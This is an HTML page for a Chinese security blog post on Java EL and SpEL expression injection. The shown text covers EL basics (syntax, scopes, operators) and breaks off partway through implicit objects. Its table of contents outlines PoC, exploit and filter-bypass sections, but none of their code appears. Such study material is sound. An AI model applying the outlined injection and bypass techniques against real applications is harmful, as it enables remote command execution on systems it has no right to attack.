@@ -1,0 +1,741 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="这篇文章主要介绍EL表达式注入和SPEL表达式注入 EL 表达式注入EL（Expression Language）表达式是一种在Java EE（Java Platform, Enterprise Edition）中使用的表达式语言，主要用于简化JSP（JavaServer Pages）页面中的数据访问和表达式计算。EL表达式使得开发者可以在JSP页面中更方便地访问JavaBeans组件、集合、隐式">
+<meta property="og:type" content="article">
+<meta property="og:title" content="表达式注入">
+<meta property="og:url" content="http://example.com/2024/07/09/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="cmisl_破站">
+<meta property="og:description" content="这篇文章主要介绍EL表达式注入和SPEL表达式注入 EL 表达式注入EL（Expression Language）表达式是一种在Java EE（Java Platform, Enterprise Edition）中使用的表达式语言，主要用于简化JSP（JavaServer Pages）页面中的数据访问和表达式计算。EL表达式使得开发者可以在JSP页面中更方便地访问JavaBeans组件、集合、隐式">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2024-07-08T16:00:00.000Z">
+<meta property="article:modified_time" content="2024-08-25T19:34:02.883Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>表达式注入</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/cmisl">项目</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/2024/07/11/C3P0%20%E9%93%BE/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2024/06/12/Fastjson/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/07/09/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/07/09/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/&text=表达式注入"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/07/09/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/&title=表达式注入"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/07/09/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/&is_video=false&description=表达式注入"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=表达式注入&body=Check out this article: http://example.com/2024/07/09/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/07/09/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/&title=表达式注入"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/07/09/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/&title=表达式注入"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/07/09/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/&title=表达式注入"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/07/09/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/&title=表达式注入"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/07/09/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/&name=表达式注入&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/07/09/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/&t=表达式注入"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#EL-%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text">EL 表达式注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E8%A6%81%E7%89%B9%E7%82%B9%E5%92%8C%E7%94%A8%E9%80%94"><span class="toc-number">1.1.</span> <span class="toc-text">主要特点和用途</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B"><span class="toc-number">1.2.</span> <span class="toc-text">示例</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95"><span class="toc-number">1.3.</span> <span class="toc-text">基础语法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%8F%98%E9%87%8F"><span class="toc-number">1.3.1.</span> <span class="toc-text">获取变量</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B-1"><span class="toc-number">1.3.1.1.</span> <span class="toc-text">示例</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E7%AC%A6"><span class="toc-number">1.3.2.</span> <span class="toc-text">操作符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9A%90%E5%BC%8F%E5%AF%B9%E8%B1%A1"><span class="toc-number">1.3.3.</span> <span class="toc-text">隐式对象</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E4%BD%9C%E7%94%A8%E5%9F%9F%E7%9B%B8%E5%85%B3%E7%9A%84%E9%9A%90%E5%BC%8F%E5%AF%B9%E8%B1%A1"><span class="toc-number">1.3.4.</span> <span class="toc-text">1. 作用域相关的隐式对象</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E8%AF%B7%E6%B1%82%E7%9B%B8%E5%85%B3%E7%9A%84%E9%9A%90%E5%BC%8F%E5%AF%B9%E8%B1%A1"><span class="toc-number">1.3.5.</span> <span class="toc-text">2. 请求相关的隐式对象</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%85%B6%E4%BB%96%E9%9A%90%E5%BC%8F%E5%AF%B9%E8%B1%A1"><span class="toc-number">1.3.6.</span> <span class="toc-text">3. 其他隐式对象</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B-2"><span class="toc-number">1.3.7.</span> <span class="toc-text">示例</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%87%BD%E6%95%B0"><span class="toc-number">1.3.8.</span> <span class="toc-text">函数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9A%E4%B9%89EL%E5%87%BD%E6%95%B0"><span class="toc-number">1.3.8.1.</span> <span class="toc-text">定义EL函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0EL%E5%87%BD%E6%95%B0"><span class="toc-number">1.3.8.2.</span> <span class="toc-text">实现EL函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9C%A8JSP%E4%B8%AD%E4%BD%BF%E7%94%A8EL%E5%87%BD%E6%95%B0"><span class="toc-number">1.3.8.3.</span> <span class="toc-text">在JSP中使用EL函数</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A6%81%E7%94%A8-%E5%90%AF%E7%94%A8EL%E8%A1%A8%E8%BE%BE%E5%BC%8F"><span class="toc-number">1.3.9.</span> <span class="toc-text">禁用&#x2F;启用EL表达式</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%A8%E5%B1%80%E7%A6%81%E7%94%A8EL%E8%A1%A8%E8%BE%BE%E5%BC%8F"><span class="toc-number">1.3.9.1.</span> <span class="toc-text">全局禁用EL表达式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8D%95%E4%B8%AA%E6%96%87%E4%BB%B6%E7%A6%81%E7%94%A8EL%E8%A1%A8%E8%BE%BE%E5%BC%8F"><span class="toc-number">1.3.9.2.</span> <span class="toc-text">单个文件禁用EL表达式</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.4.</span> <span class="toc-text">EL注入漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E7%94%A8-PoC"><span class="toc-number">1.4.1.</span> <span class="toc-text">通用 PoC</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87"><span class="toc-number">1.5.</span> <span class="toc-text">绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80-EXP"><span class="toc-number">1.5.1.</span> <span class="toc-text">基础 EXP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-ScriptEngine-%E8%B0%83%E7%94%A8-JS-%E5%BC%95%E6%93%8E%E7%BB%95%E8%BF%87"><span class="toc-number">1.5.2.</span> <span class="toc-text">利用 ScriptEngine 调用 JS 引擎绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#POC%E8%A7%A3%E9%87%8A"><span class="toc-number">1.5.3.</span> <span class="toc-text">POC解释</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.5.4.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-Unicode-%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-number">1.5.5.</span> <span class="toc-text">利用 Unicode 编码绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%85%AB%E8%BF%9B%E5%88%B6%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-number">1.5.6.</span> <span class="toc-text">利用八进制编码绕过</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5"><span class="toc-number">2.</span> <span class="toc-text">SPEL表达式注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D"><span class="toc-number">2.1.</span> <span class="toc-text">介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SpEL-%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%9F%BA%E7%A1%80"><span class="toc-number">2.2.</span> <span class="toc-text">SpEL 表达式基础</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SPEL%E5%AE%9A%E7%95%8C%E7%AC%A6"><span class="toc-number">2.2.1.</span> <span class="toc-text">SPEL定界符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E7%B1%BB%E5%9E%8B"><span class="toc-number">2.2.2.</span> <span class="toc-text">SPEL表达式类型</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AD%97%E9%9D%A2%E9%87%8F%E8%A1%A8%E8%BE%BE%E5%BC%8F"><span class="toc-number">2.2.2.1.</span> <span class="toc-text">字面量表达式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B1%9E%E6%80%A7%E8%A1%A8%E8%BE%BE%E5%BC%8F"><span class="toc-number">2.2.2.2.</span> <span class="toc-text">属性表达式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E8%A1%A8%E8%BE%BE%E5%BC%8F"><span class="toc-number">2.2.2.3.</span> <span class="toc-text">方法表达式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E7%AC%A6%E8%A1%A8%E8%BE%BE%E5%BC%8F"><span class="toc-number">2.2.2.4.</span> <span class="toc-text">操作符表达式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%B1%BB%E5%9E%8B%E8%A1%A8%E8%BE%BE%E5%BC%8F"><span class="toc-number">2.2.2.5.</span> <span class="toc-text">类型表达式</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SpEL-%E7%94%A8%E6%B3%95"><span class="toc-number">2.3.</span> <span class="toc-text">SpEL 用法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%81%B6%E6%84%8F%E6%8C%87%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">2.3.1.</span> <span class="toc-text">恶意指令执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E7%B1%BB%E5%AE%9E%E4%BE%8B"><span class="toc-number">2.3.2.</span> <span class="toc-text">创建类实例</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SpEL%E8%BF%90%E7%AE%97"><span class="toc-number">2.3.3.</span> <span class="toc-text">SpEL运算</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E8%BF%90%E7%AE%97"><span class="toc-number">2.3.3.1.</span> <span class="toc-text">基本运算</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AE%97%E6%95%B0%E8%BF%90%E7%AE%97"><span class="toc-number">2.3.3.1.1.</span> <span class="toc-text">算数运算</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%85%B3%E7%B3%BB%E8%BF%90%E7%AE%97"><span class="toc-number">2.3.3.1.2.</span> <span class="toc-text">关系运算</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%80%BB%E8%BE%91%E8%BF%90%E7%AE%97"><span class="toc-number">2.3.3.1.3.</span> <span class="toc-text">逻辑运算</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9D%A1%E4%BB%B6%E8%BF%90%E7%AE%97"><span class="toc-number">2.3.3.1.4.</span> <span class="toc-text">条件运算</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F"><span class="toc-number">2.3.3.1.5.</span> <span class="toc-text">正则表达式</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%9B%86%E5%90%88%E6%93%8D%E4%BD%9C"><span class="toc-number">2.3.3.2.</span> <span class="toc-text">集合操作</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E8%AE%BF%E9%97%AE%E9%9B%86%E5%90%88%E5%85%83%E7%B4%A0"><span class="toc-number">2.3.3.2.1.</span> <span class="toc-text">1. 访问集合元素</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E6%98%A0%E5%B0%84%E6%93%8D%E4%BD%9C"><span class="toc-number">2.3.3.2.2.</span> <span class="toc-text">2. 映射操作</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-%E9%9B%86%E5%90%88%E8%BF%87%E6%BB%A4"><span class="toc-number">2.3.3.2.3.</span> <span class="toc-text">3. 集合过滤</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4-%E9%9B%86%E5%90%88%E6%8A%95%E5%BD%B1"><span class="toc-number">2.3.3.2.4.</span> <span class="toc-text">4. 集合投影</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#5-%E9%9B%86%E5%90%88%E6%8E%92%E5%BA%8F"><span class="toc-number">2.3.3.2.5.</span> <span class="toc-text">5. 集合排序</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#6-%E9%9B%86%E5%90%88%E8%81%9A%E5%90%88"><span class="toc-number">2.3.3.2.6.</span> <span class="toc-text">6. 集合聚合</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#7-%E9%9B%86%E5%90%88%E8%BD%AC%E6%8D%A2"><span class="toc-number">2.3.3.2.7.</span> <span class="toc-text">7. 集合转换</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%8C%E6%95%B4%E4%BB%A3%E7%A0%81%E5%8F%82%E8%80%83"><span class="toc-number">2.3.3.2.8.</span> <span class="toc-text">完整代码参考</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%87%AA%E5%AE%9A%E4%B9%89%E6%96%B9%E6%B3%95"><span class="toc-number">2.3.4.</span> <span class="toc-text">自定义方法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SPEL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.4.</span> <span class="toc-text">SPEL注入漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">2.4.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#POC"><span class="toc-number">2.4.2.</span> <span class="toc-text">POC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bypass"><span class="toc-number">2.4.3.</span> <span class="toc-text">bypass</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JavaScript-Engine-Bypass"><span class="toc-number">2.4.4.</span> <span class="toc-text">JavaScript Engine Bypass</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">3.</span> <span class="toc-text">参考</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        表达式注入
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">cmisl</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-07-08T16:00:00.000Z" class="dt-published" itemprop="datePublished">2024-07-09</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>这篇文章主要介绍EL表达式注入和SPEL表达式注入</p>
+<h1 id="EL-表达式注入"><a href="#EL-表达式注入" class="headerlink" title="EL 表达式注入"></a>EL 表达式注入</h1><p>EL（Expression Language）表达式是一种在Java EE（Java Platform, Enterprise Edition）中使用的表达式语言，主要用于简化JSP（JavaServer Pages）页面中的数据访问和表达式计算。EL表达式使得开发者可以在JSP页面中更方便地访问JavaBeans组件、集合、隐式对象等。</p>
+<p>EL表达式的基本语法如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;expression&#125;F</span><br></pre></td></tr></table></figure>
+
+<p>其中，<code>expression</code>是一个可以计算的表达式。EL表达式可以包含变量、运算符、方法调用等。</p>
+<h2 id="主要特点和用途"><a href="#主要特点和用途" class="headerlink" title="主要特点和用途"></a>主要特点和用途</h2><ol>
+<li><p><strong>简化数据访问</strong>：EL表达式可以简化对JavaBeans属性的访问，例如：</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;user.name&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这行代码会自动调用<code>user</code>对象的<code>getName()</code>方法。</p>
+</li>
+<li><p><strong>集合访问</strong>：EL表达式可以方便地访问集合（如List、Map）中的元素，例如：</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$&#123;myList[<span class="number">0</span>]&#125;</span><br><span class="line">$&#123;myMap[<span class="string">&#x27;key&#x27;</span>]&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>隐式对象</strong>：EL表达式提供了一些隐式对象，如<code>param</code>、<code>requestScope</code>、<code>sessionScope</code>等，用于访问请求参数、请求范围、会话范围等数据。</p>
+</li>
+<li><p><strong>运算符</strong>：EL表达式支持各种运算符，包括算术运算符、关系运算符、逻辑运算符等。</p>
+</li>
+</ol>
+<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><p>假设有一个名为<code>user</code>的JavaBean对象，其中包含<code>name</code>和<code>age</code>属性，可以在JSP页面中使用EL表达式来显示这些属性：</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1&gt;User Information&lt;/h1&gt;</span><br><span class="line">    &lt;p&gt;Name: $&#123;user.name&#125;&lt;/p&gt;</span><br><span class="line">    &lt;p&gt;Age: $&#123;user.age&#125;&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>在这个例子中，<code>$&#123;user.name&#125;</code>和<code>$&#123;user.age&#125;</code>会分别调用<code>user</code>对象的<code>getName()</code>和<code>getAge()</code>方法，并将结果显示在页面上。</p>
+<p>EL表达式在JSP开发中非常有用，它简化了代码，提高了开发效率，并且使得JSP页面更加清晰和易于维护。</p>
+<h2 id="基础语法"><a href="#基础语法" class="headerlink" title="基础语法"></a>基础语法</h2><h3 id="获取变量"><a href="#获取变量" class="headerlink" title="获取变量"></a>获取变量</h3><ol>
+<li><p><strong>Page Scope（页面作用域）</strong>：</p>
+<ul>
+<li>作用域范围：仅在当前JSP页面内有效。</li>
+<li>隐式对象：<code>pageScope</code>。</li>
+<li>示例：<code>$&#123;pageScope.myVariable&#125;</code>。</li>
+</ul>
+</li>
+<li><p><strong>Request Scope（请求作用域）</strong>：</p>
+<ul>
+<li>作用域范围：在一次HTTP请求内有效，包括请求转发。</li>
+<li>隐式对象：<code>requestScope</code>。</li>
+<li>示例：<code>$&#123;requestScope.myVariable&#125;</code>。</li>
+</ul>
+</li>
+<li><p><strong>Session Scope（会话作用域）</strong>：</p>
+<ul>
+<li>作用域范围：在一次用户会话内有效，通常跨越多个请求。</li>
+<li>隐式对象：<code>sessionScope</code>。</li>
+<li>示例：<code>$&#123;sessionScope.myVariable&#125;</code>。</li>
+</ul>
+</li>
+<li><p><strong>Application Scope（应用作用域）</strong>：</p>
+<ul>
+<li>作用域范围：在整个Web应用程序内有效，所有用户共享。</li>
+<li>隐式对象：<code>applicationScope</code>。</li>
+<li>示例：<code>$&#123;applicationScope.myVariable&#125;</code>。</li>
+</ul>
+</li>
+</ol>
+<p>如果没有指定作用域，EL表达式会按照以下顺序查找变量：</p>
+<ol>
+<li><strong>Page Scope</strong></li>
+<li><strong>Request Scope</strong></li>
+<li><strong>Session Scope</strong></li>
+<li><strong>Application Scope</strong></li>
+</ol>
+<p>例如：</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;myVariable&#125;</span><br></pre></td></tr></table></figure>
+
+<p>EL表达式会依次在Page Scope、Request Scope、Session Scope和Application Scope中查找<code>myVariable</code>，并返回第一个找到的值。</p>
+<h4 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h4><p>假设在Request Scope中有一个名为<code>user</code>的变量，可以在JSP页面中使用EL表达式来访问它：</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1&gt;User Information&lt;/h1&gt;</span><br><span class="line">    &lt;p&gt;Name: $&#123;user.name&#125;&lt;/p&gt;</span><br><span class="line">    &lt;p&gt;Age: $&#123;user.age&#125;&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>在这个例子中，<code>$&#123;user.name&#125;</code>和<code>$&#123;user.age&#125;</code>会自动在Request Scope中查找<code>user</code>对象，并调用其<code>getName()</code>和<code>getAge()</code>方法。</p>
+<h3 id="操作符"><a href="#操作符" class="headerlink" title="操作符"></a>操作符</h3><table>
+<thead>
+<tr>
+<th align="center">类型</th>
+<th>符号</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">算术型</td>
+<td>+、-（二元）、<code>*</code>、&#x2F;、div、%、mod、-（一元）</td>
+</tr>
+<tr>
+<td align="center">逻辑型</td>
+<td>and、&amp;&amp;、or、双管道符、!、not</td>
+</tr>
+<tr>
+<td align="center">关系型</td>
+<td>&#x3D;&#x3D;、eq、!&#x3D;、ne、&lt;、lt、&gt;、gt、&lt;&#x3D;、le、&gt;&#x3D;、ge。可以与其他值进行比较，或与布尔型、字符串型、整型或浮点型文字进行比较。</td>
+</tr>
+<tr>
+<td align="center">空</td>
+<td>empty 空操作符是前缀操作，可用于确定值是否为空。</td>
+</tr>
+<tr>
+<td align="center">条件型</td>
+<td>A ?B :C。根据 A 赋值的结果来赋值 B 或 C。</td>
+</tr>
+</tbody></table>
+<h3 id="隐式对象"><a href="#隐式对象" class="headerlink" title="隐式对象"></a>隐式对象</h3><ol>
+<li><p>在EL（Expression Language）表达式中，隐式对象是预定义的变量，用于访问特定的数据或对象。这些隐式对象提供了对请求参数、请求头、作用域变量等的便捷访问方式。以下是一些常用的EL隐式对象：</p>
+<h3 id="1-作用域相关的隐式对象"><a href="#1-作用域相关的隐式对象" class="headerlink" title="1. 作用域相关的隐式对象"></a>1. 作用域相关的隐式对象</h3><ul>
